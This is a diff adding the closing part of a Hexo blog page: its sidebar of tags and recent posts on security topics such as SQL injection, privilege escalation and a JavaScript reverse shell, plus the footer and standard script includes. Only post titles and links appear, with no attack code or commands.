+      <ul class="tag-list"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/DVWA/">DVWA</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Suid-提权/">Suid 提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/git提权/">git提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/http方法利用/">http方法利用</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/joomla-cms-注入/">joomla cms 注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/js反弹shell/">js反弹shell</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/sql注入/">sql注入</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suid提权/">suid提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ubuntu-16-04-bpf-提权/">ubuntu 16.04 bpf 提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/vmware/">vmware</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/wireshark/">wireshark</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/提权/">提权</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/文件删除/">文件删除</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/时间盲注/">时间盲注</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/本地文件包含/">本地文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/杂项/">杂项</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/漏洞/">漏洞</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/语法/">语法</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/远程命令执行/">远程命令执行</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/远程文件包含/">远程文件包含</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/错误解决方案/">错误解决方案</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/DVWA/" style="font-size: 20px;">DVWA</a> <a href="/tags/Suid-提权/" style="font-size: 10px;">Suid 提权</a> <a href="/tags/git提权/" style="font-size: 10px;">git提权</a> <a href="/tags/http方法利用/" style="font-size: 10px;">http方法利用</a> <a href="/tags/joomla-cms-注入/" style="font-size: 10px;">joomla cms 注入</a> <a href="/tags/js反弹shell/" style="font-size: 10px;">js反弹shell</a> <a href="/tags/sql注入/" style="font-size: 10px;">sql注入</a> <a href="/tags/suid提权/" style="font-size: 10px;">suid提权</a> <a href="/tags/ubuntu-16-04-bpf-提权/" style="font-size: 10px;">ubuntu 16.04 bpf 提权</a> <a href="/tags/vmware/" style="font-size: 10px;">vmware</a> <a href="/tags/wireshark/" style="font-size: 10px;">wireshark</a> <a href="/tags/提权/" style="font-size: 10px;">提权</a> <a href="/tags/文件删除/" style="font-size: 10px;">文件删除</a> <a href="/tags/时间盲注/" style="font-size: 10px;">时间盲注</a> <a href="/tags/本地文件包含/" style="font-size: 10px;">本地文件包含</a> <a href="/tags/杂项/" style="font-size: 20px;">杂项</a> <a href="/tags/漏洞/" style="font-size: 20px;">漏洞</a> <a href="/tags/语法/" style="font-size: 10px;">语法</a> <a href="/tags/远程命令执行/" style="font-size: 10px;">远程命令执行</a> <a href="/tags/远程文件包含/" style="font-size: 10px;">远程文件包含</a> <a href="/tags/错误解决方案/" style="font-size: 10px;">错误解决方案</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/10/">October 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/10/04/远程文件包含错误解决方法/">错误提示【URL file-access is disabled in the server configuration in】解决</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/04/删除github的某个文件/">删除github的某个文件</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/04/配置nat实现网络互通/">配置NAT实现网络互通</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/04/利用js文件反弹shell/">利用js文件反弹shell</a>
+          </li>
+        
+          <li>
+            <a href="/2019/10/04/解决wireshark没有捕获端口的问题/">解决wireshark没有捕获端口的问题</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
